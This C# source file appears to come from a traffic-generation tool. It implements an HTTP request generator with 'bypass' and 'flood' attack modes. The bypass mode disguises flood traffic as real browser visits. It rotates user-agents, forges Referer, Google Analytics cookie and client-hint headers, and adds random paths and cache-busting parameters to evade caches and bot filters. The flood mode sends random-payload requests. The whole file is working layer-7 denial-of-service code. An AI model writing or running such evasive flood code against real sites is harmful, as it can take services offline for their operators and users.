using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UIIA.Models;

namespace UIIA.Services
{
    public class HttpTrafficGenerator : ITrafficGenerator
    {
        private readonly HttpClient _httpClient;

        private static readonly string[] UserAgents = new[]
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
        };

        private static readonly string[] Referers = new[]
        {
            "https://www.google.com",
            "https://www.youtube.com",
            "https://www.reddit.com",
            "https://twitter.com",
            "https://github.com"
        };

        private static readonly string[] AcceptHeaders = new[]
        {
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        };

        private static readonly string[] AcceptLanguages = new[]
        {
            "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "en-US,en;q=0.9,ru;q=0.8",
            "ru;q=0.9,en;q=0.8"
        };

        public string Protocol => "http";

        public HttpTrafficGenerator(HttpClient httpClient)
        {
            _httpClient = httpClient ?? throw new ArgumentNullException(nameof(httpClient));
        }

        public async Task<MetricRecord> SendRequestAsync(string target, TestConfig config)
        {
            return config.AttackMode switch
            {
                "bypass" => await BypassAttackAsync(target, config),
                "flood" => await FloodAttackAsync(target, config),
                _ => await StandardRequestAsync(target, config)
            };
        }

        private async Task<MetricRecord> StandardRequestAsync(string target, TestConfig config)
        {
            var record = new MetricRecord();
            var stopwatch = Stopwatch.StartNew();

            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, target);

                if (config.Headers != null)
                {
                    foreach (var header in config.Headers)
                    {
                        request.Headers.TryAddWithoutValidation(header.Key, header.Value);
                    }
                }

                if (!string.IsNullOrWhiteSpace(config.BodyFile) && File.Exists(config.BodyFile))
                {
                    var content = await File.ReadAllTextAsync(config.BodyFile);
                    request.Content = new StringContent(content, Encoding.UTF8, "application/json");
                    request.Method = HttpMethod.Post;
                }

                using var cts = new CancellationTokenSource(config.TimeoutMs);
                using var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseContentRead, cts.Token);

                record.StatusCode = (int)response.StatusCode;
                if (response.Content != null)
                {
                    var bytes = await response.Content.ReadAsByteArrayAsync();
                    record.ResponseSizeBytes = bytes.Length;
                }
                record.IsError = !response.IsSuccessStatusCode;
            }
            catch
            {
                record.IsError = true;
                record.StatusCode = 0;
            }

            stopwatch.Stop();
            record.LatencyMs = stopwatch.ElapsedMilliseconds;
            record.Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            return record;
        }

        private async Task<MetricRecord> BypassAttackAsync(string target, TestConfig config)
        {
            var record = new MetricRecord();
            var stopwatch = Stopwatch.StartNew();

            try
            {
                var uri = new Uri(target);
                var path = GenerateRandomPath();
                var fullUri = new Uri(uri, path);

                if (Random.Shared.Next(2) == 0)
                {
                    var builder = new StringBuilder(fullUri.ToString());
                    builder.Append(builder.ToString().Contains("?") ? "&" : "?");
                    builder.Append($"_={GenerateSecureRandomString(8)}");
                    fullUri = new Uri(builder.ToString());
                }

                var useGet = Random.Shared.Next(100) < 80;
                using var request = new HttpRequestMessage(useGet ? HttpMethod.Get : HttpMethod.Post, fullUri);

                SetMimicHeaders(request, config);

                if (!useGet)
                {
                    var bodySize = Math.Max(config.PacketSize, 256);
                    var body = GenerateSecureRandomString(bodySize);
                    request.Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
                }

                if (Random.Shared.Next(2) == 0)
                {
                    request.Headers.Referrer = new Uri(Referers[Random.Shared.Next(Referers.Length)]);
                }

                if (Random.Shared.Next(2) == 0)
                {
                    request.Headers.TryAddWithoutValidation("Cookie", $"_ga={GenerateSecureRandomString(8)}; _gid={GenerateSecureRandomString(8)}");
                }

                using var cts = new CancellationTokenSource(config.TimeoutMs);
                using var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, cts.Token);

                record.StatusCode = (int)response.StatusCode;
                record.IsError = !response.IsSuccessStatusCode;
            }
            catch
            {
                record.IsError = true;
                record.StatusCode = 0;
            }

            stopwatch.Stop();
            record.LatencyMs = stopwatch.ElapsedMilliseconds;
            record.Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            return record;
        }

        private async Task<MetricRecord> FloodAttackAsync(string target, TestConfig config)
        {
            var record = new MetricRecord();
            var stopwatch = Stopwatch.StartNew();

            try
            {
                var isGet = config.PacketSize <= 512 && Random.Shared.Next(2) == 0;
                var payload = GenerateSecureRandomString(config.PacketSize);
                using var request = new HttpRequestMessage(isGet ? HttpMethod.Get : HttpMethod.Post, target);

                if (isGet)
                {
                    var uri = new Uri(target.EndsWith("/") ? target + payload : target + "/" + payload);
                    request.RequestUri = uri;
                }
                else
                {
                    request.Content = new StringContent(payload, Encoding.UTF8, "text/plain");
                }

                request.Headers.TryAddWithoutValidation("User-Agent", UserAgents[Random.Shared.Next(UserAgents.Length)]);

                using var cts = new CancellationTokenSource(config.TimeoutMs);
                using var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, cts.Token);

                record.StatusCode = (int)response.StatusCode;
                record.IsError = !response.IsSuccessStatusCode;
            }
            catch
            {
                record.IsError = true;
                record.StatusCode = 0;
            }

            stopwatch.Stop();
            record.LatencyMs = stopwatch.ElapsedMilliseconds;
            record.Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            return record;
        }

        private void SetMimicHeaders(HttpRequestMessage request, TestConfig config)
        {
            request.Headers.TryAddWithoutValidation("User-Agent", UserAgents[Random.Shared.Next(UserAgents.Length)]);
            request.Headers.TryAddWithoutValidation("Accept", AcceptHeaders[Random.Shared.Next(AcceptHeaders.Length)]);
            request.Headers.TryAddWithoutValidation("Accept-Language", AcceptLanguages[Random.Shared.Next(AcceptLanguages.Length)]);
            request.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip, deflate, br");
            request.Headers.TryAddWithoutValidation("Cache-Control", Random.Shared.Next(2) == 0 ? "no-cache" : "max-age=0");
            request.Headers.TryAddWithoutValidation("Sec-Ch-Ua", "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"");
            request.Headers.TryAddWithoutValidation("Sec-Ch-Ua-Mobile", "?0");
            request.Headers.TryAddWithoutValidation("Sec-Ch-Ua-Platform", "\"Windows\"");

            if (config.Headers != null)
            {
                foreach (var header in config.Headers)
                {
                    request.Headers.TryAddWithoutValidation(header.Key, header.Value);
                }
            }
        }

        private static string GenerateRandomPath()
        {
            var exts = new[] { "", "", ".js", ".css", ".png", ".jpg", ".svg", ".html" };
            var basePath = GenerateSecureRandomString(6);
            var ext = exts[Random.Shared.Next(exts.Length)];

            if (Random.Shared.Next(3) == 0)
            {
                return basePath + "/" + GenerateSecureRandomString(4) + ext;
            }

            return basePath + ext;
        }

        private static string GenerateSecureRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return string.Create(length, (chars, length), (span, state) =>
            {
                for (int i = 0; i < state.length; i++)
                {
                    span[i] = state.chars[Random.Shared.Next(state.chars.Length)];
                }
            });
        }
    }
}